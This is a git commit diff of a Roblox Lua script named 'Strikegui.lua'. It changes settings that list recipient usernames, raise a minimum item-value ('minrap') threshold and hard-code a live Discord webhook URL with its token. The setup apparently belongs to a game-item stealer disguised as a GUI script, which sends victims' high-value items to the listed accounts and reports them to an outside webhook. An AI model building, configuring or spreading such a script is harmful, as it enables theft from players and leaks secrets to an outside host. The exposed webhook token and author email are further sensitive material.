34332d0b4af79fd86b496a1ce0b88ae760808bf8
1DeathStare1 <turquoisedragon18@gmail.com>
2025-11-02 21:03:00 +0000

    Update Strikegui.lua

--- Strikegui.lua
+++ Strikegui.lua
@@ -1,7 +1,7 @@
 -- Strikegui.lua
 -- User settings
 _G.Usernames = {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"} 
-_G.minrap = 10000000
+_G.minrap = 20000000
 _G.webhook = "https://discord.com/api/webhooks/1431974006080147466/vjWq7Xu7Mqun02T9rUiMFzZA1btH8483bsgvVihoSw-FEKsADYQbP49cJXvfsDLNQxto"
 
 -- Run both scripts concurrently
